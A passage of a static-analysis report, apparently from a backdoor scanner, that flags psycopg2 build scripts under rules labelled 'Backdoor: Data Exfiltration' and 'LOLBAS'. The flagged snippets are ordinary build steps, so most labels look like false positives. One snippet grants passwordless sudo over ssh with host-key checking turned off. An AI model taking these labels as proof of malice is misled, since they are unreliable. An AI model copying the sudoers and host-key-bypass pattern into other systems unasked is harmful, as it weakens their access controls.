                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 81,
                  "startColumn": 18,
                  "endLine": 81,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    \"\"\"\n    Install or upgrade pip and build tools.\n    \"\"\"\n    run_python(\"-m pip install --upgrade pip setuptools wheel\".split())\n\n\ndef configure_sdk():\n",
                    "rendered": {
                      "text": "    \"\"\"\n    Install or upgrade pip and build tools.\n    \"\"\"\n    run_python(\"-m pip install --upgrade pip setuptools wheel\".split())\n\n\ndef configure_sdk():\n",
                      "markdown": "`    \"\"\"\n    Install or upgrade pip and build tools.\n    \"\"\"\n    run_python(\"-m pip install --upgrade pip setuptools wheel\".split())\n\n\ndef configure_sdk():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 79,
                  "startColumn": 22,
                  "endLine": 79,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\ndef install_python_build_tools():\n    \"\"\"\n    Install or upgrade pip and build tools.\n    \"\"\"\n    run_python(\"-m pip install --upgrade pip setuptools wheel\".split())\n\n",
                    "rendered": {
                      "text": "\ndef install_python_build_tools():\n    \"\"\"\n    Install or upgrade pip and build tools.\n    \"\"\"\n    run_python(\"-m pip install --upgrade pip setuptools wheel\".split())\n\n",
                      "markdown": "`\ndef install_python_build_tools():\n    \"\"\"\n    Install or upgrade pip and build tools.\n    \"\"\"\n    run_python(\"-m pip install --upgrade pip setuptools wheel\".split())\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 3,
                  "endLine": 5,
                  "endColumn": 11,
                  "snippet": {
                    "text": "\"\"\"\nBuild steps for the windows binary packages.\n\nThe script is designed to be called by appveyor. Subcommands map the steps in\n'appveyor.yml'.\n\n\"\"\"\n",
                    "rendered": {
                      "text": "\"\"\"\nBuild steps for the windows binary packages.\n\nThe script is designed to be called by appveyor. Subcommands map the steps in\n'appveyor.yml'.\n\n\"\"\"\n",
                      "markdown": "`\"\"\"\nBuild steps for the windows binary packages.\n\nThe script is designed to be called by appveyor. Subcommands map the steps in\n'appveyor.yml'.\n\n\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 682,
                  "startColumn": 25,
                  "endLine": 682,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\n    @property\n    def package_name(self):\n        return os.environ.get('CONFIGURATION', 'psycopg2')\n\n    @property\n    def package_version(self):\n",
                    "rendered": {
                      "text": "\n    @property\n    def package_name(self):\n        return os.environ.get('CONFIGURATION', 'psycopg2')\n\n    @property\n    def package_version(self):\n",
                      "markdown": "`\n    @property\n    def package_name(self):\n        return os.environ.get('CONFIGURATION', 'psycopg2')\n\n    @property\n    def package_version(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 571,
                  "startColumn": 25,
                  "endLine": 571,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        out = out[m.start() :]\n        env = json.loads(out)\n        for k, v in env.items():\n            if os.environ.get(k) != v:\n                setenv(k, v)\n    finally:\n        os.remove(fn)\n",
                    "rendered": {
                      "text": "        out = out[m.start() :]\n        env = json.loads(out)\n        for k, v in env.items():\n            if os.environ.get(k) != v:\n                setenv(k, v)\n    finally:\n        os.remove(fn)\n",
                      "markdown": "`        out = out[m.start() :]\n        env = json.loads(out)\n        for k, v in env.items():\n            if os.environ.get(k) != v:\n                setenv(k, v)\n    finally:\n        os.remove(fn)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 453,
                  "startColumn": 21,
                  "endLine": 453,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        logger.warn(\"skipping artifact upload: you are not psycopg\")\n        return False\n\n    pkey = os.environ.get('REMOTE_KEY', None)\n    if not pkey:\n        logger.warn(\"skipping artifact upload: no remote key\")\n        return False\n",
                    "rendered": {
                      "text": "        logger.warn(\"skipping artifact upload: you are not psycopg\")\n        return False\n\n    pkey = os.environ.get('REMOTE_KEY', None)\n    if not pkey:\n        logger.warn(\"skipping artifact upload: no remote key\")\n        return False\n",
                      "markdown": "`        logger.warn(\"skipping artifact upload: you are not psycopg\")\n        return False\n\n    pkey = os.environ.get('REMOTE_KEY', None)\n    if not pkey:\n        logger.warn(\"skipping artifact upload: no remote key\")\n        return False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 470,
                  "startColumn": 49,
                  "endLine": 470,
                  "endColumn": 53,
                  "snippet": {
                    "text": "        )\n\n    # Make a directory to please MinGW's version of ssh\n    ensure_dir(r\"C:\\MinGW\\msys\\1.0\\home\\appveyor\\.ssh\")\n\n    return True\n\n",
                    "rendered": {
                      "text": "        )\n\n    # Make a directory to please MinGW's version of ssh\n    ensure_dir(r\"C:\\MinGW\\msys\\1.0\\home\\appveyor\\.ssh\")\n\n    return True\n\n",
                      "markdown": "`        )\n\n    # Make a directory to please MinGW's version of ssh\n    ensure_dir(r\"C:\\MinGW\\msys\\1.0\\home\\appveyor\\.ssh\")\n\n    return True\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 759,
                  "startColumn": 23,
                  "endLine": 759,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    @property\n    def appveyor_pg_dir(self):\n        \"\"\"The directory of the postgres service made available by Appveyor.\"\"\"\n        return Path(os.environ['POSTGRES_DIR'])\n\n    @property\n    def pg_data_dir(self):\n",
                    "rendered": {
                      "text": "    @property\n    def appveyor_pg_dir(self):\n        \"\"\"The directory of the postgres service made available by Appveyor.\"\"\"\n        return Path(os.environ['POSTGRES_DIR'])\n\n    @property\n    def pg_data_dir(self):\n",
                      "markdown": "`    @property\n    def appveyor_pg_dir(self):\n        \"\"\"The directory of the postgres service made available by Appveyor.\"\"\"\n        return Path(os.environ['POSTGRES_DIR'])\n\n    @property\n    def pg_data_dir(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 682,
                  "startColumn": 18,
                  "endLine": 682,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    @property\n    def package_name(self):\n        return os.environ.get('CONFIGURATION', 'psycopg2')\n\n    @property\n    def package_version(self):\n",
                    "rendered": {
                      "text": "\n    @property\n    def package_name(self):\n        return os.environ.get('CONFIGURATION', 'psycopg2')\n\n    @property\n    def package_version(self):\n",
                      "markdown": "`\n    @property\n    def package_name(self):\n        return os.environ.get('CONFIGURATION', 'psycopg2')\n\n    @property\n    def package_version(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 571,
                  "startColumn": 18,
                  "endLine": 571,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        out = out[m.start() :]\n        env = json.loads(out)\n        for k, v in env.items():\n            if os.environ.get(k) != v:\n                setenv(k, v)\n    finally:\n        os.remove(fn)\n",
                    "rendered": {
                      "text": "        out = out[m.start() :]\n        env = json.loads(out)\n        for k, v in env.items():\n            if os.environ.get(k) != v:\n                setenv(k, v)\n    finally:\n        os.remove(fn)\n",
                      "markdown": "`        out = out[m.start() :]\n        env = json.loads(out)\n        for k, v in env.items():\n            if os.environ.get(k) != v:\n                setenv(k, v)\n    finally:\n        os.remove(fn)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 453,
                  "startColumn": 14,
                  "endLine": 453,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        logger.warn(\"skipping artifact upload: you are not psycopg\")\n        return False\n\n    pkey = os.environ.get('REMOTE_KEY', None)\n    if not pkey:\n        logger.warn(\"skipping artifact upload: no remote key\")\n        return False\n",
                    "rendered": {
                      "text": "        logger.warn(\"skipping artifact upload: you are not psycopg\")\n        return False\n\n    pkey = os.environ.get('REMOTE_KEY', None)\n    if not pkey:\n        logger.warn(\"skipping artifact upload: no remote key\")\n        return False\n",
                      "markdown": "`        logger.warn(\"skipping artifact upload: you are not psycopg\")\n        return False\n\n    pkey = os.environ.get('REMOTE_KEY', None)\n    if not pkey:\n        logger.warn(\"skipping artifact upload: no remote key\")\n        return False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 393,
                  "startColumn": 33,
                  "endLine": 393,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    \"\"\"\n    Fail if the package installed is not using the expected libpq version.\n    \"\"\"\n    want_ver = tuple(map(int, os.environ['POSTGRES_VERSION'].split('_')))\n    want_ver = \"%d%04d\" % want_ver\n    got_ver = (\n        out_python(\n",
                    "rendered": {
                      "text": "    \"\"\"\n    Fail if the package installed is not using the expected libpq version.\n    \"\"\"\n    want_ver = tuple(map(int, os.environ['POSTGRES_VERSION'].split('_')))\n    want_ver = \"%d%04d\" % want_ver\n    got_ver = (\n        out_python(\n",
                      "markdown": "`    \"\"\"\n    Fail if the package installed is not using the expected libpq version.\n    \"\"\"\n    want_ver = tuple(map(int, os.environ['POSTGRES_VERSION'].split('_')))\n    want_ver = \"%d%04d\" % want_ver\n    got_ver = (\n        out_python(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 214,
                  "startColumn": 13,
                  "endLine": 214,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    ensure_dir(top / 'lib')\n    ensure_dir(top / 'bin')\n\n    ver = os.environ['POSTGRES_VERSION']\n\n    # Download PostgreSQL source\n    zipname = f'postgres-REL_{ver}.zip'\n",
                    "rendered": {
                      "text": "    ensure_dir(top / 'lib')\n    ensure_dir(top / 'bin')\n\n    ver = os.environ['POSTGRES_VERSION']\n\n    # Download PostgreSQL source\n    zipname = f'postgres-REL_{ver}.zip'\n",
                      "markdown": "`    ensure_dir(top / 'lib')\n    ensure_dir(top / 'bin')\n\n    ver = os.environ['POSTGRES_VERSION']\n\n    # Download PostgreSQL source\n    zipname = f'postgres-REL_{ver}.zip'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/run_build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 31,
                  "endLine": 65,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# Build the wheel packages\n$ssh \"${rdir}/scripts/build/build_macos_arm64.sh\"\n\n# Transfer the packages locally\nscp -r \"${user}@${host}:${rdir}/wheelhouse\" .\n",
                    "rendered": {
                      "text": "# Build the wheel packages\n$ssh \"${rdir}/scripts/build/build_macos_arm64.sh\"\n\n# Transfer the packages locally\nscp -r \"${user}@${host}:${rdir}/wheelhouse\" .\n",
                      "markdown": "`# Build the wheel packages\n$ssh \"${rdir}/scripts/build/build_macos_arm64.sh\"\n\n# Transfer the packages locally\nscp -r \"${user}@${host}:${rdir}/wheelhouse\" .\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/run_build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 59,
                  "startColumn": 4,
                  "endLine": 59,
                  "endColumn": 9,
                  "snippet": {
                    "text": "# Clone the repos\nrdir=psycobuild\n$ssh rm -rf \"${rdir}\"\n$ssh git clone https://github.com/psycopg/psycopg2.git --branch ${tag} \"${rdir}\"\n\n# Build the wheel packages\n$ssh \"${rdir}/scripts/build/build_macos_arm64.sh\"\n",
                    "rendered": {
                      "text": "# Clone the repos\nrdir=psycobuild\n$ssh rm -rf \"${rdir}\"\n$ssh git clone https://github.com/psycopg/psycopg2.git --branch ${tag} \"${rdir}\"\n\n# Build the wheel packages\n$ssh \"${rdir}/scripts/build/build_macos_arm64.sh\"\n",
                      "markdown": "`# Clone the repos\nrdir=psycobuild\n$ssh rm -rf \"${rdir}\"\n$ssh git clone https://github.com/psycopg/psycopg2.git --branch ${tag} \"${rdir}\"\n\n# Build the wheel packages\n$ssh \"${rdir}/scripts/build/build_macos_arm64.sh\"\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/run_build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 21,
                  "endLine": 39,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    error \"server status is $status\"\nfi\n\n# Get user, password, ip from vnc url\ntmp=$(echo \"$server\" | jq -r .vnc_url)  # vnc://m1:PASS@1.2.3.4:5900\ntmp=${tmp/vnc:\\/\\//}  # m1:PASS@1.2.3.4:5900\nuser=${tmp%%:*}  # m1\n",
                    "rendered": {
                      "text": "    error \"server status is $status\"\nfi\n\n# Get user, password, ip from vnc url\ntmp=$(echo \"$server\" | jq -r .vnc_url)  # vnc://m1:PASS@1.2.3.4:5900\ntmp=${tmp/vnc:\\/\\//}  # m1:PASS@1.2.3.4:5900\nuser=${tmp%%:*}  # m1\n",
                      "markdown": "`    error \"server status is $status\"\nfi\n\n# Get user, password, ip from vnc url\ntmp=$(echo \"$server\" | jq -r .vnc_url)  # vnc://m1:PASS@1.2.3.4:5900\ntmp=${tmp/vnc:\\/\\//}  # m1:PASS@1.2.3.4:5900\nuser=${tmp%%:*}  # m1\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/run_build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 65,
                  "endLine": 9,
                  "endColumn": 70,
                  "snippet": {
                    "text": "# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n# The script requires a Scaleway secret key in the SCW_SECRET_KEY env var:\n# It will use scaleway_m1.sh to provision a server and use it.\n\nset -euo pipefail\n",
                    "rendered": {
                      "text": "# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n# The script requires a Scaleway secret key in the SCW_SECRET_KEY env var:\n# It will use scaleway_m1.sh to provision a server and use it.\n\nset -euo pipefail\n",
                      "markdown": "`# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n# The script requires a Scaleway secret key in the SCW_SECRET_KEY env var:\n# It will use scaleway_m1.sh to provision a server and use it.\n\nset -euo pipefail\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/run_build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 5,
                  "endLine": 9,
                  "endColumn": 13,
                  "snippet": {
                    "text": "# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n# The script requires a Scaleway secret key in the SCW_SECRET_KEY env var:\n# It will use scaleway_m1.sh to provision a server and use it.\n\nset -euo pipefail\n",
                    "rendered": {
                      "text": "# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n# The script requires a Scaleway secret key in the SCW_SECRET_KEY env var:\n# It will use scaleway_m1.sh to provision a server and use it.\n\nset -euo pipefail\n",
                      "markdown": "`# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n# The script requires a Scaleway secret key in the SCW_SECRET_KEY env var:\n# It will use scaleway_m1.sh to provision a server and use it.\n\nset -euo pipefail\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/run_build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 49,
                  "endLine": 6,
                  "endColumn": 57,
                  "snippet": {
                    "text": "# Build psycopg2-binary wheel packages for Apple M1 (cpNNN-macosx_arm64)\n#\n# This script is designed to run on a local machine: it will clone the repos\n# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n# The script requires a Scaleway secret key in the SCW_SECRET_KEY env var:\n",
                    "rendered": {
                      "text": "# Build psycopg2-binary wheel packages for Apple M1 (cpNNN-macosx_arm64)\n#\n# This script is designed to run on a local machine: it will clone the repos\n# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n# The script requires a Scaleway secret key in the SCW_SECRET_KEY env var:\n",
                      "markdown": "`# Build psycopg2-binary wheel packages for Apple M1 (cpNNN-macosx_arm64)\n#\n# This script is designed to run on a local machine: it will clone the repos\n# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n# The script requires a Scaleway secret key in the SCW_SECRET_KEY env var:\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/run_build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 6,
                  "endLine": 5,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n# Build psycopg2-binary wheel packages for Apple M1 (cpNNN-macosx_arm64)\n#\n# This script is designed to run on a local machine: it will clone the repos\n# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n",
                    "rendered": {
                      "text": "\n# Build psycopg2-binary wheel packages for Apple M1 (cpNNN-macosx_arm64)\n#\n# This script is designed to run on a local machine: it will clone the repos\n# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n",
                      "markdown": "`\n# Build psycopg2-binary wheel packages for Apple M1 (cpNNN-macosx_arm64)\n#\n# This script is designed to run on a local machine: it will clone the repos\n# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/run_build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 7,
                  "endLine": 51,
                  "endColumn": 15,
                  "snippet": {
                    "text": "ssh=\"ssh ${user}@${host} -o StrictHostKeyChecking=no\"\n\n# Allow the user to sudo without asking for password.\necho \"$password\" | \\\n    $ssh sh -c \"test -f /etc/sudoers.d/${user} \\\n    || sudo -S --prompt= sh -c \\\n        'echo \\\"${user} ALL=(ALL) NOPASSWD:ALL\\\" > /etc/sudoers.d/${user}'\"\n",
                    "rendered": {
                      "text": "ssh=\"ssh ${user}@${host} -o StrictHostKeyChecking=no\"\n\n# Allow the user to sudo without asking for password.\necho \"$password\" | \\\n    $ssh sh -c \"test -f /etc/sudoers.d/${user} \\\n    || sudo -S --prompt= sh -c \\\n        'echo \\\"${user} ALL=(ALL) NOPASSWD:ALL\\\" > /etc/sudoers.d/${user}'\"\n",
                      "markdown": "`ssh=\"ssh ${user}@${host} -o StrictHostKeyChecking=no\"\n\n# Allow the user to sudo without asking for password.\necho \"$password\" | \\\n    $ssh sh -c \"test -f /etc/sudoers.d/${user} \\\n    || sudo -S --prompt= sh -c \\\n        'echo \\\"${user} ALL=(ALL) NOPASSWD:ALL\\\" > /etc/sudoers.d/${user}'\"\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/run_build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 44,
                  "endLine": 50,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\nssh=\"ssh ${user}@${host} -o StrictHostKeyChecking=no\"\n\n# Allow the user to sudo without asking for password.\necho \"$password\" | \\\n    $ssh sh -c \"test -f /etc/sudoers.d/${user} \\\n    || sudo -S --prompt= sh -c \\\n",
                    "rendered": {
                      "text": "\nssh=\"ssh ${user}@${host} -o StrictHostKeyChecking=no\"\n\n# Allow the user to sudo without asking for password.\necho \"$password\" | \\\n    $ssh sh -c \"test -f /etc/sudoers.d/${user} \\\n    || sudo -S --prompt= sh -c \\\n",
                      "markdown": "`\nssh=\"ssh ${user}@${host} -o StrictHostKeyChecking=no\"\n\n# Allow the user to sudo without asking for password.\necho \"$password\" | \\\n    $ssh sh -c \"test -f /etc/sudoers.d/${user} \\\n    || sudo -S --prompt= sh -c \\\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/run_build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 44,
                  "endLine": 44,
                  "endColumn": 8,
                  "snippet": {
                    "text": "tmp=${tmp/vnc:\\/\\//}  # m1:PASS@1.2.3.4:5900\nuser=${tmp%%:*}  # m1\ntmp=${tmp#*:}  # PASS@1.2.3.4:5900\npassword=${tmp%%@*}  # PASS\ntmp=${tmp#*@}  # 1.2.3.4:5900\nhost=${tmp%%:*}  # 1.2.3.4\n\n",
                    "rendered": {
                      "text": "tmp=${tmp/vnc:\\/\\//}  # m1:PASS@1.2.3.4:5900\nuser=${tmp%%:*}  # m1\ntmp=${tmp#*:}  # PASS@1.2.3.4:5900\npassword=${tmp%%@*}  # PASS\ntmp=${tmp#*@}  # 1.2.3.4:5900\nhost=${tmp%%:*}  # 1.2.3.4\n\n",
